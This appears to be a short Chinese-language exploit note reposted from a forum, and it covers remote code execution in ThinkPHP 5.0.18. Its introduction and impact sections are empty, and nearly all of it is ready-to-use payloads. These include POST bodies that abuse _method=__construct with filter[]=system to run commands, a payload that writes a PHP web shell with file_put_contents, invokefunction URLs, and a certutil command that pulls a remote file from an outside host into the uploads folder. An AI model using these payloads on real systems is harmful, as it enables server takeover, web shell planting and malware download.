# Thinkphp 5.0.18

> 原文：[https://www.zhihuifly.com/t/topic/3153](https://www.zhihuifly.com/t/topic/3153)

# Thinkphp 5.0.18

## 一、漏洞简介

## 二、漏洞影响

## 三、复现过程

> https://www.0-sec.org/?s=index/index

```
POST `s=whoami&_method=__construct&method=POST&filter[]=system

aaaa=whoami&_method=__construct&method=GET&filter[]=system

_method=__construct&method=GET&filter[]=system&get[]=whoami

c=system&f=calc&_method=filter` 
```

> 写shell

```
POST `s=file_put_contents(‘zerosec.php’,’<?php phpinfo();’)&_method=__construct&method=POST&filter[]=assert` 
```

> 有captcha路由时无需debug=true

> https://www.0-sec.org/?s=captcha/calc

```
POST `_method=__construct&filter[]=system&method=GET` 
```

### 1、windows

```
http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][0]=1 
```

```
http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=assert&vars[1][0]=phpinfo() 
```

### 2、使用certutil

```
http://www.xxxx.com/?s=admin/\think\app/invokefunction&function=call_user_func_array&vars[0]=passthru&vars[1][0]=cmd /c certutil -urlcache -split -f https://www.hack.com/xxx.js uploads/1.php 
```

由于根目录没写权限，所以写到uploads